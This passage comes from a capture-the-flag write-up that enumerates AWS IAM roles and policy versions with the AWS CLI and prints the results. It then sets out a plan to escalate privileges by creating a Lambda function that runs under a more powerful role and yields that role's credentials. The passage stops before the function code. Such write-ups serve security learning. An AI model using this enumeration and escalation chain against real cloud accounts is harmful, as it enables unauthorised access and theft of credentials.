</span></span><span class=line><span class=cl>                <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=s2>&#34;sts:AssumeRole&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;MaxSessionDuration&#34;</span><span class=p>:</span> <span class=mi>3600</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Tools like <code>enumerate-iam</code> wouldn&rsquo;t be able to tell you if you are able to run commands like <code>aws iam-list-attached-role-policies</code>, whereby an additional argument is required (<code>--role-name</code> in this case). When dealing with IAM roles, we generally want to see what kind of permissions it has by retrieving a list of policies attached to the role and then enumerating said policies for its permissions.</p><p>In short, we want to run 2 commands per AWS IAM role:</p><ol><li><code>aws iam list-attached-role-policies --role-name &lt;role_name></code></li><li><code>aws iam get-policy-version --policy-arn &lt;policy_arn> --version-id &lt;version_id></code></li></ol><p>Lets go ahead and run these commands for the <code>ec2_agent_role</code> and the <code>lambda_development_agent_role</code> to see what permissions it has!</p><p><code>ec2_agent_role</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam list-attached-role-policies --role-name ec2_agent_role                                            <span class=m>255</span> ⨯
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;AttachedPolicies&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyName&#34;</span>: <span class=s2>&#34;iam_policy_for_ec2_agent_role&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyArn&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agent_role --version-id v1
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyVersion&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Document&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;dynamodb:DescribeTable&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;dynamodb:ListTables&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;dynamodb:Scan&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;dynamodb:Query&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor0&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;VersionId&#34;</span>: <span class=s2>&#34;v1&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;IsDefaultVersion&#34;</span>: true,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-07-22T09:29:34Z&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Woah, permissions to interact with the <code>dynamodb</code> service! How about <code>lambda_agent_development_role</code>?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam list-attached-role-policies --role-name lambda_agent_development_role
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;AttachedPolicies&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyName&#34;</span>: <span class=s2>&#34;iam_policy_for_lambda_agent_development_role&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyArn&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v1
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyVersion&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Document&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:RunInstances&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:CreateVolume&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:CreateTags&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:PassRole&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/ec2_agent_role&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor2&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;VersionId&#34;</span>: <span class=s2>&#34;v1&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;IsDefaultVersion&#34;</span>: false,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-07-22T09:29:36Z&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Wow, run an ec2 instance!? But wait, before we carry on did you notice that in the <code>ec2_agent_role</code>, <code>IsDefaultVersion</code> is set to <code>true</code> but for <code>lambda_agent_development_role</code>, <code>IsDefaultVersion</code> is seto to <code>false</code>. What does this mean??</p><p>Policies in AWS generally have a version tag, and normally it goes <code>v1</code>, <code>v2</code>, <code>v3</code>&mldr;.etc. Quoting from the AWS documentation:
<code>One of the versions of a managed policy is set as the default version. The policy's default version is the operative version—that is, it's the version that is in effect for all of the principal entities (users, user groups, and roles) that the managed policy is attached to.</code></p><p>Which means that we should enumerate out for the version that has <code>IsDefaultVersion</code> set to <code>true</code> to get the one in effect! Let&rsquo;s do that for <code>lambda_agent_development_role</code> and find a version that has that set</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyVersion&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Document&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:RunInstances&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:CreateVolume&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:CreateTags&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;lambda:GetFunction&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:lambda:ap-southeast-1:051751498533:function:cat-service&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:PassRole&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/ec2_agent_role&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor2&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;VersionId&#34;</span>: <span class=s2>&#34;v2&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;IsDefaultVersion&#34;</span>: true,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-08-23T13:16:26Z&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Indeed, we notice something new, a <code>cat-service</code> function!</p><p>Alright we have additional information about these roles but, the question still begets, what can our AWS credentials do? This is where we do some deeper enumeration and run commands like <code>aws iam list-attached-user-policies</code> and passing in the appropriate <code>--user-name</code> as shown below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam list-attached-user-policies --user-name <span class=k>$(</span>aws sts get-caller-identity <span class=p>|</span> jq .Arn <span class=p>|</span> awk -F<span class=s1>&#39;/&#39;</span> <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> tr -d <span class=s1>&#39;&#34;&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;AttachedPolicies&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>        <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyName&#34;</span>: <span class=s2>&#34;user-66648ab7e833453d8881002651a45a47&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;PolicyArn&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47&#34;</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/user-66648ab7e833453d8881002651a45a47 --version-id v1
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;PolicyVersion&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;Document&#34;</span>: <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;2012-10-17&#34;</span>,
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Statement&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor0&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:GetPolicy&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:GetPolicyVersion&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:ListAttachedRolePolicies&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:ListRoles&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor1&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;lambda:CreateFunction&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;lambda:InvokeFunction&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;lambda:GetFunction&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:lambda:ap-southeast-1:051751498533:function:</span><span class=si>${</span><span class=nv>aws</span><span class=p>:</span><span class=nv>username</span><span class=si>}</span><span class=s2>-*&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor2&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:ListAttachedUserPolicies&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:user/</span><span class=si>${</span><span class=nv>aws</span><span class=p>:</span><span class=nv>username</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor3&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:PassRole&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;arn:aws:iam::051751498533:role/lambda_agent_development_role&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>,
</span></span><span class=line><span class=cl>                <span class=o>{</span>
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Sid&#34;</span>: <span class=s2>&#34;VisualEditor4&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Effect&#34;</span>: <span class=s2>&#34;Allow&#34;</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Action&#34;</span>: <span class=o>[</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeVpcs&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeRegions&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeSubnets&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeRouteTables&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeSecurityGroups&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;ec2:DescribeInstanceTypes&#34;</span>,
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;iam:ListInstanceProfiles&#34;</span>
</span></span><span class=line><span class=cl>                    <span class=o>]</span>,
</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Resource&#34;</span>: <span class=s2>&#34;*&#34;</span>
</span></span><span class=line><span class=cl>                <span class=o>}</span>
</span></span><span class=line><span class=cl>            <span class=o>]</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;VersionId&#34;</span>: <span class=s2>&#34;v1&#34;</span>,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;IsDefaultVersion&#34;</span>: true,
</span></span><span class=line><span class=cl>        <span class=s2>&#34;CreateDate&#34;</span>: <span class=s2>&#34;2022-09-10T15:52:36Z&#34;</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Oh, so turns out we can create a lambda function and invoke it. Not only that but our lambda function can be created with the <code>lambda_agent_development_role</code>!</p><p>Before we continue let&rsquo;s take a step back and look back on what we&rsquo;ve uncovered so far:</p><p><img loading=lazy src=/images/posts/tisc-2022-level4-diagram-1.jpg alt=diagram-1></p><h2 id=abusing-lambda-functions>Abusing Lambda Functions<a hidden class=anchor aria-hidden=true href=#abusing-lambda-functions>#</a></h2><p>Let&rsquo;s look back on our user&rsquo;s policy, specifically the lambda-related permissions:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Sid&#34;</span><span class=p>:</span> <span class=s2>&#34;VisualEditor1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Effect&#34;</span><span class=p>:</span> <span class=s2>&#34;Allow&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Action&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;lambda:CreateFunction&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;lambda:InvokeFunction&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;lambda:GetFunction&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;Resource&#34;</span><span class=p>:</span> <span class=s2>&#34;arn:aws:lambda:ap-southeast-1:051751498533:function:${aws:username}-*&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Notice that our user is able to create/invoke/get lambda functions for functions that start with the <code>{aws:username}-</code>. One can get the username for the provided user credentials with the following bash script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ cat get_username.sh 
</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>aws sts get-caller-identity <span class=p>|</span> jq .Arn <span class=p>|</span> awk -F<span class=s1>&#39;/&#39;</span> <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span>tr -d <span class=s1>&#39;&#34;&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>In addition, the lambda function that we create would have the <code>lambda_agent_development_role</code>. Let&rsquo;s try to create and invoke such a lambda function, whereby our aim is to get a set of temporary AWS IAM credentials that has the <code>lambda_agent_development_role</code> role.</p><h3 id=creating-the-lambda-function>Creating the Lambda Function<a hidden class=anchor aria-hidden=true href=#creating-the-lambda-function>#</a></h3><p>The lambda function that we would attempt to create would contain the following arguments:</p><ul><li><code>--function-name</code>: We get the <code>{aws:username}</code> and then concatenate an arbitrary name like <code>-env</code> to the end of it.</li><li><code>--role</code>: the role would be the <code>lambda_agent_development_role</code></li><li><code>--runtime</code>: we will create a javascript file and therefore use a runtime environment like <code>nodejs12.x</code>.</li><li><code>--handler</code>: <code>index.handler</code>. an index.js file would be created and zipped as explained below</li><li><code>--zip-file</code>: a zip file <code>function.zip</code> would be created containing an <code>index.js</code>, which contains the following piece of code:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
